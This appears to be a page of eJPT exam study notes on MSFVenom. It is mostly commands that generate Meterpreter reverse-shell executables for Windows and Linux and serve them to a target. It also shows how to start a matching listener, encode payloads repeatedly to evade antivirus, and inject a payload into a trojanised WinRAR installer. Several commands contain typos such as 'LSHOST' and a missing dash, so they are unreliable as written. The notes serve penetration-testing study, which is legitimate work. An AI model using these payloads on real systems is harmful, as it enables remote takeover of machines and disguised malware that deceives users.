## MSFVenom

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

### Generating Payload with MSFVenom
```
msfvenom —list payloads
```
#### Windows
```
msfvenom -a x86 -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f exe > home/kali/Desktop/Windows_Payloads/payloadx86.exe
```
```
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f exe > home/kali/Desktop/Windows_Payloads/payloadx64.exe
```
```
msfvenom —list formats
```

#### Linux
```
msfvenom p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f elf > home/kali/Desktop/Linux_Payloads/payloadx86
```
```
msfvenom p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f elf > home/kali/Desktop/Linux_Payloads/payloadx64
```

#### Usage
```
sudo python -m SimpleHTTPServer 8080
sudo python3 -m http.server 8080
```
These commands create a basic HTTP server in the folder where they are executed, running on port 8080.

Metasploit needs to be opened and running the module multi/handler with a configuration that matches the payload.
```
msfconsole
use multi/handler
set payload windows/x86/meterpreter/reverse_tcp
```
On the target machine, we can open a browser and download the file. Alternatively, we can use "wget" on Linux or "certutil" on Windows.


### Encoding Payload with MSFVenom
```
msfvenom —list encoders
```
```
msfvenom -p windows/meterpreter/reverse_tcp LSHOST=10.10.10.1 LPORT=1234 -e x86/shikata_ga_nai -f exe > /Desktop/encode_dx86.exe
```
```
msfvenom -p windows/meterpreter/reverse_tcp LSHOST=10.10.10.1 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > /Desktop/encode_dx86.exe
```
This command attempts to elude firewall or antivirus by encoding the payload 10 times. "shikata_ga_nai" is the most effective method because it employs a polymorphic type encoding. However, beyond 10 iterations, its effectiveness diminishes.


### Injecting Payload into windows portable executables
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x /Downloads/winrar602.exe > /Desktop/Windows_Payloads/winrar.exe
```
This command injects the payload into winrar.exe, but it doesn’t retain the original function of the executable.

To retain some of the original functionalities, we need to add the -k flag, although this command doesn’t always work.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x /Downloads/winrar602.exe > /Desktop/Windows_Payloads/winrar_new.exe
```
